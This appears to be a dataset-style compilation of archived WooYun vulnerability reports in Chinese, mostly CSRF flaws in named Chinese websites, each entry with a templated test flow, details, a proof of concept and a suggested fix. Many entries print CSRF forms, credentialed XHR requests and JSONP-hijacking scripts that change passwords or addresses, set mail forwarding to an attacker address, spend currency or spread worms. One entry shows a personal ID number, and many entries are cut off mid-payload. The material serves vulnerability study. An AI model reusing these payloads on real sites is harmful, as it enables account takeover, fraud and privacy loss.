**POC**: 背景：某手机厂商的手机本身有flyme远程账户，用于存储通讯录、短信等私密信息。核心：论坛改版后可使用flyme帐号密码登录论坛.自评：个人给予漏洞等级：高。原因在于用户的通讯录以及私密短信泄漏，并且可操作flyme帐户金额、远程锁定手机等功能。注意：下方提供的连接中使用的c.cn仅为本机host域名 重现请自己修改JS调用域名等信息图一为IE下的远程JS调用，可直接操控页面连接：https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: CSRF我相信某手机厂商能修复的。
---

---
### [wooyun-2012-06536] wooyun CSRF漏洞
**厂商**: Wooyun | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改资料页无token

**POC**: <meta charset=utf-8 ><form action="//www.wooyun.org/user.php?action=update&amp;do=editinfo" method="POST"><div class="infoContent block"><table class="formTable"><tbody><tr><th width="100">个人主页：</th><td><input type="text" name="homepage" ></td></tr><tr><th valign="top">个人简介：</th><td><textarea rows="

**绕过**: 直接利用

**修复**: 还是不晓得
---

---
### [wooyun-2011-02088] 某邮箱服务CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某邮箱服务有个很强大的功能叫做“自动转发”，然后这个功能没有做CSRF预防。看看设置转发的http包吧：GET /autofw/fwto.do?sid=XXXXXXXXXXXXXXXXXXXXXXXXX&forwarddes=hacker@hacker.com&keeplocal=1&callback=MM.autofwd.valCallback HTTP/1.1Host: config.mail.126.comReferer: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/534.24Acc

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你懂的。
---

---
### [wooyun-2015-0121415] 返还网CSRF漏洞一枚（任意更改收货地址）
**厂商**: 返还网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先我们来抓包看下收货地址我们构造下poc就可以，只需要一张图片即可，图片访问会自动发出请求更加的隐蔽OK 我们访问下，就会发现已经更改了已经测试两个帐号 都可以CSRF地址

**POC**: OK 我们访问下，就会发现已经更改了

**绕过**: 直接利用

**修复**: 增加验证即可
---

---
### [wooyun-2015-0118767] 名鞋库网CSRF小礼包
**厂商**: 名鞋库网络科技有限公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 修改个人信息没有加上任何验证。提交数据我就不贴上了，现在我们构造一个表单，代码如下：<html><head><title>poc</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="name" value="wooyun"><input type="hidden" name="sex" value="2"><input type="hidden" name="_DTYPE_DATE%5B%5D" value="birt

**绕过**: 直接利用

**修复**: 加上token或者其他的验证
---

---
### [wooyun-2014-086465] 搜房网之看我如何无限刷粉丝
**厂商**: 搜房网 | **年份**: 2014 | **类型**: csrf

**元思考**: 触发信号: 功能测试

**洞察**: csrf防护不足，开发者信任前端输入

**测试流程**:
1. 识别csrf相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先。。抓一只实验小白鼠https://example.com/[已脱敏] 就你了点关注截包，，，如图Get型的。。so easy 有refer  在后面加  “.xxxx” 绕过。。。！！轻松Copy url：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 你懂得。。refer 那里。。或者加token..就这样吧。。你们比我懂
---

---
### [wooyun-2015-090935] 某邮箱服务突破token限制CSRF设置任意提醒
**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 我们以往的后台CSRF需要面对的困难是后台操作加上token，就无法构造了。这个思路就可以解决这个难题，通过referer来取得token / sid 之后，利用header重定向，自动实现CSRF。具体到本案例，某邮箱服务的这个利用构成基于两个要点：1 使用远程图片来获取referer，在某互联网公司邮件中的图片，referer会带有收件人的sid2 使用SID的GET命令来生成日历提醒，定时执行指定内容。通过一个简单的脚本将以上两点结合制作成自动执行功能。这个思路同样适合任何token在链接中的程序，比如wap某互联网公司，以及大部分手机应用。操作步骤：将附加代码保存在网站上，向目标受害者发送一封内容普通的邮件，通过插入图片功能调用这个链接。当受害者查看图片的时候，触发CSRF，会后台自动加入一个日历提醒。根据程序代码，3分钟后弹出右下角弹窗，同时在新邮件列表中显示红色醒目文字。这个弹出的内容不但可以写

**POC**: 首先发送一个迷惑邮件，受害者查看邮件是这样的：此时已经感染，3分钟后，受害者桌面右下角会弹出邮箱提示：点开详细内容是这样，不受任何过滤词限制：同时显示在邮件列表中是红色醒目文字：

**绕过**: 直接利用

**修复**: just xss it.
---

---
### [wooyun-2014-077959] 药房网APP某处横向权限问题
**厂商**: yaofang.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 地址修改画面在保存时把userid修改成其他用户的ID后可以把地址保存到其他用户。并且这个画面存在CSRF，可以批量把地址保存到其他的帐户里，虽然没什么意义，呵呵。但做为一个安全问题，请修正。地址修改画面:用户188的手机登录，userid:2988294用户156的手机登录，userid:2988309用户156在修改地址时把userid改成188的用户的值修改前修改后成功用户188的手机登录确认，地址穿越了。。。

**POC**: 同上

**绕过**: 直接利用

**修复**: 保存时对userid进行验证，加上瞬时授权验证token。
---

---
### [wooyun-2013-020417] 人人网分享feed中的图片可以任意修改的漏洞
**厂商**: 人人网 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在此,我选择曾经的一个活动:用户点击下的对URL则视为成功邀请某好友参加活动https://example.com/[已脱敏] "杜蕾斯SOS App -紧急快递杜蕾斯",URL为 https://example.com/[已脱敏] https://example.com/[已脱敏] 输入视频URL,然后会有弹出层,如下图,让用户填写分享理由此时用 firebug ,修改隐藏的form 将pic字段更改为攻击目标,然后分享大功告成,去首页看看吧这样只要好友打开他的人人主页 即视为邀

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 直接获取图片
---

---
### [wooyun-2014-069792] 乐蜂网csrf漏洞可通过改邮箱来改密码
**厂商**: 乐蜂网 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 截到的post请求如下：u为用户编号，v为修改的邮箱，这个用户编号在浏览他人主页是可以得到的，请求中的s编号虽然变化但是试了下没什么用。

**POC**: 返回2应该是正确，反正邮箱收到了哈。。邮箱修改成功，也没有任何短信提示，悄无声息了。下面就可以登陆时候点击’忘记密码‘了

**绕过**: 直接利用

**修复**: 这个不应该get请求控制
---

---
### [wooyun-2015-093225] 蝉知企业门户系统 v3.3csrf修改管理员密码
**厂商**: chanzhi.org | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 蝉知企业门户系统 v3.3最新版本 存在csrf漏洞而且我测试的时候发现，即使修改了密码，管理员也不会马上需要重新登陆，所以配合我的回旋镖，可以达到神不知鬼不觉的修改其管理密码接下来，我就来详细的演示漏洞过程

**POC**: 1、我们进入后台，发现没有添加管理员，那么我们来尝试一下修改管理员密码很有意思，我们发现修改管理员的密码，不需要验证原密码~~~好危险撒！那我们再来抓包截断看看有没有token之类的验证2、用burpsuite截断我的小伙伴们都惊呆了 有木有？？没有验证，就两个password3、构造表单吧!<html><body><form id="post123" name="post123" action="http://[IP已脱敏] method="POST"><input type="hidden" name="passwo

**绕过**: 直接利用

**修复**: 首先是修改密码这里，加一个原密码验证，还有就是加token验证，防御csrf攻击！
---

---
### [wooyun-2014-051104] 利用csrf漏洞强制消费其他人的Q币
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在jifen.某域名.com  里面 选 几个兑换积分加Q币的  我选一个绿钻https://example.com/[已脱敏] 让别人消费9个Q币确定兑换因为我没有Q币就余额不足现在把网址记下来https://example.com/[已脱敏]  一般登入这个页面看不了什么  别人通常会点登入登入进去之后显示消费了9个Q币     他会得到一个月的绿钻提前  有足够的Q币  和积分    一般游戏用户都会有。算强制性的吧

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 不知道哦  主要在积分商城那里
---

---
### [wooyun-2013-040552] 某社交平台csrf漏洞任意刷粉
**厂商**: 某互联网公司 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 疏忽了吧，这里加粉的接口用的是get方法。这样的程序员该拉出去 tjjtds 。https://example.com/[已脱敏]  这里加关注的接口以韩寒某社交平台为例，利用链接https://example.com/[已脱敏] https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 修改为post方法。
---

---
### [wooyun-2015-0133359] csrf 构造语句可随意修改密码
**厂商**: efly.cc | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: https://example.com/[已脱敏] 密码就会自动改城123456接口没加验证

**绕过**: 直接利用

**修复**: 你比我懂
---

---
### [wooyun-2015-0126946] 珍品网收货地址存在csrf
**厂商**: 珍品网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 参数注入

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改收货地址，看包修改成功：其中addr_id为自增值，无不可预测参数，构造csrf链接xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("addr_id=86261&receiver=woo126sss&province=%E5%8C%97%E4%BA%AC%E5%B8%82&city=%E4%B8%9C%E5%9F%8E%E5%8C%BA&town=%E4%BA%8C%E7%8E%AF%E5%86%85&address=fszhfdzh&postcode=100005&m

**POC**: 同上求礼物。。。

**绕过**: 直接利用

**修复**: 验证referer加token
---

---
### [wooyun-2013-044633] 某视频网站旗下星梦csrf(可关注，取消，修改昵称)
**厂商**: 某视频网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: (见原文)

**绕过**: 直接利用

**修复**: null
---

---
### [wooyun-2014-080615] 帝国CMS 7.0最新版CSRF漏洞2枚
**厂商**: 帝国CMS | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 第一枚：CSRF增加个人信息地址漏洞URLhttp://[IP已脱敏] 位置在留言板2 删除留言的抓包请求如下，直接是个GET3 然后由于没有token，所以可以构造CSRF删除留言。利用URL http://[IP已脱敏]

**POC**: 如上

**绕过**: 直接利用

**修复**: 加token验证
---

---
### [wooyun-2014-065028] 深圳社保局少儿医保存在漏洞，登陆后可查询其他参保人的大量关键信息。
**厂商**: szsi.gov.cn | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误

**元思考**: 触发信号: 认证接口

**洞察**: 设计缺陷/逻辑错误防护不足，开发者信任前端输入

**测试流程**:
1. 识别设计缺陷/逻辑错误相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 其实这个问题在2009年的时候，我就发现了。当初我家宝宝出生参加少儿医保，我登陆网站查询我家宝宝信息。由于专业的关系，看到网址，就试着修改了网址中关键的社保电脑号，果然可以查询其他少儿承保人的信息，当初以为会很快改，可是这么多年过去，还是一样.......更改网址中的GRCODE：https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0115931] 智联招聘CSRF漏洞重置任意帐号
**厂商**: 智联招聘 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.其实这个故事是这样，最近在智联招聘投简历,在等人家回复的时候测试一下2.于是得到下面这个连接:https://example.com/[已脱敏]

**POC**: 1.于是得到下面这个连接:https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 可以尝试加个验证码或者token验证
---

---
### [wooyun-2013-035628] 某搜索引擎某分站csrf漏洞可刷粉丝
**厂商**: 某搜索引擎 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 一、某搜索引擎旅游假如要关注这个妹子https://example.com/[已脱敏]

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 判断refer来源，或者post和cookie中加token进行判定
---

---
### [wooyun-2015-0106076] 国家信息安全漏洞共享平台某功能设计缺陷导致跨站请求伪造(CSRF)
**厂商**: 国家信息安全漏洞共享平台(CNVD) | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 国家信息安全漏洞共享平台某功能设计缺陷导致跨站请求伪造(CSRF)

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 1.验证码被认为是对抗CSRF攻击最简洁有效的防御方法。2.Referer Check.3.Anti CSRF Token.
---

---
### [wooyun-2013-036936] 爱丽网CSRF任意修改他人资料信息
**厂商**: aili.com | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 试了下爱丽网除了修改密码有限制之外，其他的修改信息都是直接GET，这样又导致了危害的扩大。抓了几个包子：https://example.com/[已脱敏] payload 伪装成图片发布到爱丽网任何可以社交的地方，(如博客，或者

**POC**: 当用户访问之后，资料被恶意串改

**绕过**: 直接利用

**修复**: 求礼物
---

---
### [wooyun-2016-0171499] 某社交平台某社交平台JSONP劫持之点我链接开始某社交平台蠕虫+刷粉丝
**厂商**: 某社交平台 | **年份**: 2016 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 0x01 发某社交平台在某社交平台旅游的攻略页面中有个提问的功能，提示“此问题会同步到你的某社交平台某社交平台”。https://example.com/[已脱敏] 关注有些攻略页面会嵌入一些旅行网的某社交平台，上面有关注功能，比如：https://example.com/[已脱敏]

**POC**: 登录某社交平台，点我链接：https://example.com/[已脱敏] type="text/javascript" src="https://example.com/[已脱敏]"></script><script>$(function() {var sendweibo = 'https://example.com/[已脱敏]'var content = "这里有好东西，赶紧看，你懂得！https://example.com/[已脱敏]

**绕过**: 过滤绕过

**修复**: 修复JSONP劫持欢迎关注我某社交平台！！https://example.com/[已脱敏]
---

---
### [wooyun-2015-0125194] 佳品网 csrf一枚 收货地址随意修改
**厂商**: 佳品网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 修改收货地址，查看包修改成功，看地址信息构造csrf链接，主要代码：xmlhttp.open("POST", "https://example.com/[已脱敏]", true);xmlhttp.withCredentials = true;xmlhttp.setRequestHeader("Content-Type","application/x-www-form-urlencoded");xmlhttp.send("id1=315062&contact=woogggg&province=110000&city=110100&area=110101&address=fegt&address_code=000000&address_tel=13111111111&address_phone_one=111&address_phone_two=2

**POC**: 已证明

**绕过**: 直接利用

**修复**: 加token验证referer
---

---
### [wooyun-2015-0122755] 唯品会某处JSONP+CSRF泄露重要信息
**厂商**: 唯品会 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 不想复习啊，随手测一测~~~存在漏洞的地址：https://example.com/[已脱敏]

**POC**: 测试代码：<meta charset="utf-8">正在请求，请耐心等待... ...</table><script type="text/javascript">window.callback=function(e){if(e['result'] == -1){alert("屌丝,你还没登录唯品会");return 0}if(e['cartInfo']['has_goods_left']){alert("购物车中有 " + e['cartList']['count'] + " 件商品~");}var str = '<table border=1>'for(i=0;i<e['cartList

**绕过**: 直接利用

**修复**: 添加token或者判断refer或者其他防止csrf的黑科技听说你们要建立VSRC了，恭喜！求礼物！
---

---
### [wooyun-2014-086306] 宜信#CSRF（你的邮箱是我的）
**厂商**: 宜信 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 登陆状态访问url：https://example.com/[已脱敏]

**POC**: 就连1为的都可以绑定哦，直接绕过update1 update2

**绕过**: 直接利用

**修复**: 你更专业了。
---

---
### [wooyun-2014-059541] 电驴旗下x动一处csrf(可任意修改帐号密码)
**厂商**: VeryCD | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个某互联网公司我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。https://example.com/[已脱敏] B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。https://example.com/[已脱敏]

**POC**: 如果我直接发一个url的get的csrf，想必也没多大意义。。。我们主要看下csrf能不能重置密码我们看下正常流程用户A输入一个邮箱我上了两个某互联网公司我们看到A用户和B用户火狐为AIE为B然后邮箱绑定那里有一个绑定的csrf我们用IE看看修改火狐也就是用户B ：2042478584 的密码。。https://example.com/[已脱敏] B访问连接好了，我们重置下用户我们用火狐A用户修改用户IEb的密码。。https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 叫哥，哥告诉你
---

---
### [wooyun-2015-094946] 某搜索引擎书城CSRF涉及敏感操作
**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某搜索引擎书城CSRF涉及敏感操作，可被不法分子利用刷钱

**POC**: 1、为了做测试，我自己充值了1块钱  ~~~~(>_<)~~~~  求报销2、我们随便找一个图书的 VIP章节，发现需要支付，然后我们支付的时候截断我们发现没有token之类的验证，那么我们来试试可不可以实施CSRF攻击，我们先弄一个表单<html><!-- CSRF PoC - generated by Burp Suite Professional --><body><form id="post123" name="post123" action="https://example.com/[已脱敏]" method="POST"><input type="

**绕过**: 直接利用

**修复**: 你们更专业
---

---
### [wooyun-2011-02089] 某邮箱服务CSRF漏洞
**厂商**: 某互联网公司 | **年份**: 2011 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某邮箱服务设置转发HTTP包：POST /cgi-bin/setting1?sid=eP6_czyZRqFmXFwR HTTP/1.1Host: m84.mail.某域名.comReferer: https://example.com/[已脱敏] 1022Cache-Control: max-age=0Origin: https://example.com/[已脱敏] Mozilla/5.0 (Windows NT 5.1) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/[IP已脱敏] Safari/534.24Content-Type: application/x-ww

**POC**: 攻击方式：1. 在第三方站点制作一个页面，构造post表单。最关键的sid信息可从http referer中读出。2. 群发邮件，内含该恶意url. 标题很吸引人那种。3. 等着收邮件吧。

**绕过**: 直接利用

**修复**: 大家怎么都这么懒呢，一个anti-csrf token其实不费事的。分布式应用里面不能用stick session但是也可以用distributed cache啊。
---

---
### [wooyun-2013-027106] 某社交平台多处GET型高危csrf发某社交平台蠕虫
**厂商**: 某门户网站 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该问题在某社交平台活动中的分享活动处。虽然是POST，但是GET也能成功。POC:https://example.com/[已脱敏]

**POC**: 此漏洞同样可以通过某社交平台图片传播，利用方法不想再说了，上个洞子里说了。------------------------------------这也可通过某社交平台图片传播，具体可以看我提交的第二个漏洞。

**绕过**: 直接利用

**修复**: 不要GET POST混用啊要token要referer要20rank要礼物
---

---
### [wooyun-2012-08606] 爱拍某处CSRF漏洞
**厂商**: 爱拍 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受GET的信息的时候，未对GET来路(Referer)进行验证，同时也没有在GET的信息中加token验证信息的正确性，导致漏洞产生。应用场景，在某些地方，例如YY、论坛、评论，发出这个地址，或者用IMG标签引用这个地址，然后你的粉丝就倍增了~~

**POC**: https://example.com/[已脱敏]]&callback%09=scribeSuccess_new&action=addSubscribe

**绕过**: 直接利用

**修复**: 检查GET来路Referer在GET的信息中加token
---

---
### [wooyun-2015-0126096] 中舞网多处CSRF全部打包
**厂商**: 中舞网 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: <html><head><title>poc2.html</title></head><body><form action="https://example.com/[已脱敏]" method="post"><input type="hidden" name="startdate" value="2015-06-06"><input type="hidden" name="enddate" value="2015-07-07"><input type="hidden" name="companyname" value="%E5%B9%BF%E4%B8%9C%E5%86%B

**绕过**: 直接利用

**修复**: 加上token之类验证
---

---
### [wooyun-2015-093605] 某游戏公司通行证CSRF漏洞危害账户安全
**厂商**: 盛大网络 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先注册个用户登录成功，显示账号资料填写不完整，点击填补资料可以看到需要填写的项目填补资料提交如下数据name=鲁和泰idCard=340304197908257431Birthday=1990-01-01mobile=phone=question1=c_question1=answer1=question2=c_question2=answer2=1203121582Fsubmit=没有验证数据提交来源此时进行利用，csrf代码如下触发代码，即可成功。。

**POC**: csrf代码触发成功后界面再去看通行证，此时显示资料填补完整。如果知道账户名，通过这些资料信息可以直接把密码成功找回。

**绕过**: 直接利用

**修复**: 1，验证信息提交来源，是否来自合法网页；2，在数据字段要隐式添加hash值，验证数据是否合法
---

---
### [wooyun-2013-019574] 某社交平台某社交平台可以加粉丝并形成蠕虫传播
**厂商**: 某社交平台 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: https://example.com/[已脱敏]

**绕过**: 直接利用

**修复**: 别修复了。哈哈哈~~
---

---
### [wooyun-2015-0138067] 寻医问药后台校验不当导致任意刷关注
**厂商**: 寻医问药 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 后台管理

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 寻医问药系统中关注某人的链接如下：https://example.com/[已脱敏]

**POC**: 见详细

**绕过**: 直接利用

**修复**: 校验吧
---

---
### [wooyun-2011-02215] 疑似利用flash跨域0day入侵gmail成功的事件
**厂商**: google | **年份**: 2011 | **类型**: 成功的入侵事件

**元思考**: 触发信号: 功能测试

**洞察**: 成功的入侵事件防护不足，开发者信任前端输入

**测试流程**:
1. 识别成功的入侵事件相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 大家可以看到全程都是FLASH发起的请求，但是没有请求crossdomain.xml,并且取到了关键的AT等值发起CSRF。这个是很明显的一个FLASH跨域0DAY。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2012-08608] 某门户网站某处CSRF漏洞
**厂商**: 某门户网站 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 在接受POST和GET的信息的时候，未对POST来路(Referer)进行验证，同时也没有在POST的信息中加token验证信息的正确性，导致漏洞产生。

**POC**: 漏洞地址：https://example.com/[已脱敏] id="imlonghao" name="imlonghao" action="https://example.com/[已脱敏]" method="post"><input type="text" name="msg" value="XX" /><input type="text" name="act" value="insertTwitter" /><input type="text" name="groupid" value="0" /><input type="s

**绕过**: 直接利用

**修复**: 检查POST来路Referer在POST的信息中加token
---

---
### [wooyun-2013-021135] 豆瓣API 2.0接口CSRF
**厂商**: 豆瓣 | **年份**: 2013 | **类型**: CSRF

**元思考**: 触发信号: 认证接口

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 豆瓣API V2 给开发者提供了操作豆瓣账户的接口，虽然要进行oauth2.0认证。但是某些接口，只要是登录状态，不需要认证也可以使用。其中广播接口由于服务端限制不严的问题，导致存在了csrf漏洞，可以控制豆瓣登陆账号发送任意广播。

**POC**: 开发文档里描述的是只允许POST，但是实际测试发现GET方式可以直接发送广播，而且对于已经登录豆瓣的用户，也不需要oauth认证。除了发送文本外 还可以推荐网址、推送等等。求邀请码 - - 这个不会审核不通过吧，红果果的CSRF啊。

**绕过**: 直接利用

**修复**: 这个不用说了吧。（话说乌云漏洞提交还操作失败，晕，第二次了。）
---

---
### [wooyun-2014-056991] 某互联网公司公益未做认证导致CSRF可蠕虫
**厂商**: 某互联网公司 | **年份**: 2014 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: https://example.com/[已脱敏]

**POC**: <form id="Test" name="Test" action="https://example.com/[已脱敏]" method="POST"><input type="text" name="content" value="test" /><input type="text" name="title" value="Test" /><input type="submit" value="submit" /></form><script>document.Test.submit();</script>测试有效

**绕过**: 直接利用

**修复**: 1、 验证HTTP Referer字段2、在请求地址中添加token并验证3、在HTTP头中自定义属性并验证
---

---
### [wooyun-2012-06746] 某互联网公司某分站csrf漏洞
**厂商**: 某互联网公司 | **年份**: 2012 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 某互联网公司某分站未做csrf防范，导致漏洞产生!

**POC**: 1、去发某社交平台2、只要用户点击链接就触发csrf攻击

**绕过**: 直接利用

**修复**: 加入token或判断referer
---

---
### [wooyun-2015-0156392] 某快递公司快递旗下一城一品商城某处存在CSRF可添加/修改收获地址
**厂商**: 某快递公司 | **年份**: 2015 | **类型**: CSRF

**元思考**: 触发信号: 功能测试

**洞察**: CSRF防护不足，开发者信任前端输入

**测试流程**:
1. 识别CSRF相关功能
2. 构造测试Payload
3. 验证漏洞响应

